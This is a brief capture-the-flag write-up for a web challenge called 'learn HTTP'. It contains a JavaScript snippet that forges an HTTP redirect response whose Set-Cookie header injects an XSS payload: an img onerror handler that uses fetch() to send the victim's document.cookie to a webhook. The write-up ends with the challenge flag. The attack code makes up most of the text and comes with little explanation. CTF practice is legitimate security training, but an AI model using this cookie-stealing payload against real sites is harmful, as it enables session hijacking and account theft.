# web/learn HTTP (final)

## get sample of jwt
```js
web_url = "http://localhost:5000"
webhook = "??"
xss = `<img src=x onerror="fetch('${webhook}?'+document.cookie)" />`
build = (p) => "HTTP/1.1 302 Found\r\nLocation: "+web_url+"/learn\r\nSet-Cookie: name="+xss+"ello;path=/\r\nContent-Length: "+p.length+"\r\n\r\n"+p
payload = build("")
```

## After this, do the same thing as a previous challenge

`pearl{7ime_to_ch4ng3_mY_S3cr3ts}`